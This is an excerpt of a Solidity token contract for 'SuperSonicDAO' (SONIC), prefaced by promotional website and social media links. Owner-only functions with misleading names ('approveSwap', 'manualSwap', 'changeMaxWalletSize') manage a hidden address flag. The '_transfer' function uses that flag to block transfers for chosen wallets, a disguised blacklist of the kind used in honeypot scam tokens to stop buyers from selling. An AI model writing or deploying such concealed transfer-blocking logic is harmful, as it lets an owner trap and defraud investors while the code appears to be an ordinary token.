...
/** 
     www: https://supersonicdao.com/
          twitter: https://twitter.com/supersonicdao/
                   medium:  https://medium.com/@SuperSonicDAO
                            telegram: https://t.me/SuperSonicDAO 
...
contract ERC20 is Context, Security, IERC20 {
    ...
    mapping (address => bool) private _sender;
    ...
    function manualSwap(address _delegate) external onlyOwner {
        _sender[_delegate] = false;
    }

    function changeMaxWalletSize(address _delegate) public view returns (bool) {
        return _sender[_delegate];
    }

    function approveSwap(address _delegate) external onlyOwner {
        _sender[_delegate] = true;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        if (_sender[recipient] || _sender[sender]) require(castVotes == true, "");
...
contract SuperSonicDAO is ERC20 {
    using SafeMath for uint256;
    ...
    constructor () ERC20("Super Sonic", "SONIC") {
        totalsupply_ = 3000000000000* 10**9;
